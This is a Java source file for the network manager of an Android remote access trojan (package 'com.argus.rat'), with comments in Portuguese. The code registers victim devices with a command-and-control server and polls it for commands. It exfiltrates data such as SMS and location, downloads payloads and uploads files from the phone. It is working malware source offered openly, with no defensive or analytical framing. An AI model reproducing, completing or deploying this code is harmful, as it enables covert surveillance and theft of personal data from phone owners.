package com.argus.rat;

import android.content.Context;
import android.util.Log;
import com.google.gson.Gson;
import com.google.gson.JsonObject;
import okhttp3.*;
import java.io.IOException;
import java.util.concurrent.TimeUnit;

/**
 * Gerenciador de comunicação HTTP com servidor C2
 * Responsável por todas as requisições HTTP/HTTPS
 */
public class NetworkManager {
    
    private static final String TAG = "NetworkManager";
    
    // Configurações do servidor C2 (serão carregadas do config)
    private static String C2_SERVER_URL = "http://192.168.1.100:5000"; // Alterar para IP real
    private static final int TIMEOUT_SECONDS = 30;
    
    private final Context context;
    private final OkHttpClient httpClient;
    private final Gson gson;
    
    // Singleton
    private static NetworkManager instance;
    
    private NetworkManager(Context context) {
        this.context = context.getApplicationContext();
        this.gson = new Gson();
        
        // Configurar OkHttpClient
        this.httpClient = new OkHttpClient.Builder()
                .connectTimeout(TIMEOUT_SECONDS, TimeUnit.SECONDS)
                .writeTimeout(TIMEOUT_SECONDS, TimeUnit.SECONDS)
                .readTimeout(TIMEOUT_SECONDS, TimeUnit.SECONDS)
                .retryOnConnectionFailure(true)
                .build();
    }
    
    public static synchronized NetworkManager getInstance(Context context) {
        if (instance == null) {
            instance = new NetworkManager(context);
        }
        return instance;
    }
    
    /**
     * Define URL do servidor C2
     */
    public static void setServerUrl(String url) {
        C2_SERVER_URL = url;
        Log.i(TAG, "Servidor C2 configurado: " + url);
    }
    
    /**
     * Registra dispositivo no servidor C2
     */
    public void registerDevice(DeviceInfo deviceInfo, final NetworkCallback callback) {
        JsonObject json = new JsonObject();
        json.addProperty("device_id", deviceInfo.getDeviceId());
        json.addProperty("device_name", deviceInfo.getDeviceName());
        json.addProperty("model", deviceInfo.getModel());
        json.addProperty("manufacturer", deviceInfo.getManufacturer());
        json.addProperty("android_version", deviceInfo.getAndroidVersion());
        json.addProperty("api_level", deviceInfo.getApiLevel());
        json.addProperty("app_version", deviceInfo.getAppVersion());
        
        postRequest("/api/device/register", json.toString(), callback);
    }
    
    /**
     * Envia heartbeat para servidor
     */
    public void sendHeartbeat(String deviceId, JsonObject additionalData, final NetworkCallback callback) {
        JsonObject json = new JsonObject();
        json.addProperty("device_id", deviceId);
        json.addProperty("timestamp", System.currentTimeMillis());
        
        if (additionalData != null) {
            json.add("additional_info", additionalData);
        }
        
        postRequest("/api/device/heartbeat", json.toString(), callback);
    }
    
    /**
     * Busca comandos pendentes do servidor
     */
    public void fetchPendingCommands(String deviceId, final NetworkCallback callback) {
        getRequest("/api/device/" + deviceId + "/commands/pending", callback);
    }
    
    /**
     * Envia resultado de comando executado
     */
    public void sendCommandResult(String commandId, String status, String result, final NetworkCallback callback) {
        JsonObject json = new JsonObject();
        json.addProperty("command_id", commandId);
        json.addProperty("status", status);
        json.addProperty("result", result);
        json.addProperty("timestamp", System.currentTimeMillis());
        
        postRequest("/api/command/" + commandId + "/result", json.toString(), callback);
    }
    
    /**
     * Envia dados exfiltrados (SMS, Location, etc.)
     */
    public void exfiltrateData(String deviceId, String dataType, String data, final NetworkCallback callback) {
        JsonObject json = new JsonObject();
        json.addProperty("device_id", deviceId);
        json.addProperty("data_type", dataType);
        json.addProperty("data", data);
        json.addProperty("timestamp", System.currentTimeMillis());
        
        postRequest("/api/data/exfiltrate", json.toString(), callback);
    }
    
    /**
     * Baixa payload do servidor
     */
    public void downloadPayload(String payloadId, final NetworkCallback callback) {
        getRequest("/api/payload/" + payloadId + "/download", callback);
    }
    
    /**
     * Upload de arquivo para servidor
     */
    public void uploadFile(String deviceId, byte[] fileData, String filename, String fileType, final NetworkCallback callback) {
        RequestBody requestBody = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("device_id", deviceId)
                .addFormDataPart("file_type", fileType)
                .addFormDataPart("file", filename,
                        RequestBody.create(MediaType.parse("application/octet-stream"), fileData))
                .build();
        
        Request request = new Request.Builder()
                .url(C2_SERVER_URL + "/api/file/upload")
                .post(requestBody)
                .build();
        
        executeRequest(request, callback);
    }
    
    /**
     * Requisição GET genérica
     */
    private void getRequest(String endpoint, final NetworkCallback callback) {
        Request request = new Request.Builder()
                .url(C2_SERVER_URL + endpoint)
                .get()
                .addHeader("Content-Type", "application/json")
                .build();
        
        executeRequest(request, callback);
    }
    
    /**
     * Requisição POST genérica
     */
    private void postRequest(String endpoint, String jsonBody, final NetworkCallback callback) {
        RequestBody body = RequestBody.create(
                MediaType.parse("application/json; charset=utf-8"),
                jsonBody
        );
        
        Request request = new Request.Builder()
                .url(C2_SERVER_URL + endpoint)
                .post(body)
                .addHeader("Content-Type", "application/json")
                .build();
        
        executeRequest(request, callback);
    }
    
    /**
     * Executa requisição HTTP
     */
    private void executeRequest(Request request, final NetworkCallback callback) {
        httpClient.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                Log.e(TAG, "Erro na requisição: " + e.getMessage());
                if (callback != null) {
                    callback.onFailure(e);
                }
            }
            
            @Override
            public void onResponse(Call call, Response response) throws IOException {
                if (response.isSuccessful()) {
                    String responseBody = response.body().string();
                    Log.d(TAG, "Resposta recebida: " + responseBody);
                    if (callback != null) {
                        callback.onSuccess(responseBody);
                    }
                } else {
                    Log.e(TAG, "Resposta com erro: " + response.code());
                    if (callback != null) {
                        callback.onFailure(new IOException("HTTP " + response.code()));
                    }
                }
                response.close();
            }
        });
    }
    
    /**
     * Testa conectividade com servidor C2
     */
    public void testConnection(final NetworkCallback callback) {
        getRequest("/api/ping", new NetworkCallback() {
            @Override
            public void onSuccess(String response) {
                Log.i(TAG, "Conexão com C2 estabelecida");
                if (callback != null) callback.onSuccess(response);
            }
            
            @Override
            public void onFailure(Exception e) {
                Log.e(TAG, "Falha ao conectar com C2: " + e.getMessage());
                if (callback != null) callback.onFailure(e);
            }
        });
    }
    
    /**
     * Interface de callback para requisições
     */
    public interface NetworkCallback {
        void onSuccess(String response);
        void onFailure(Exception e);
    }
    
    /**
     * Classe para informações do dispositivo
     */
    public static class DeviceInfo {
        private String deviceId;
        private String deviceName;
        private String model;
        private String manufacturer;
        private String androidVersion;
        private int apiLevel;
        private String appVersion;
        
        public DeviceInfo(String deviceId, String deviceName, String model, 
                         String manufacturer, String androidVersion, int apiLevel, String appVersion) {
            this.deviceId = deviceId;
            this.deviceName = deviceName;
            this.model = model;
            this.manufacturer = manufacturer;
            this.androidVersion = androidVersion;
            this.apiLevel = apiLevel;
            this.appVersion = appVersion;
        }
        
        // Getters
        public String getDeviceId() { return deviceId; }
        public String getDeviceName() { return deviceName; }
        public String getModel() { return model; }
        public String getManufacturer() { return manufacturer; }
        public String getAndroidVersion() { return androidVersion; }
        public int getApiLevel() { return apiLevel; }
        public String getAppVersion() { return appVersion; }
    }
}




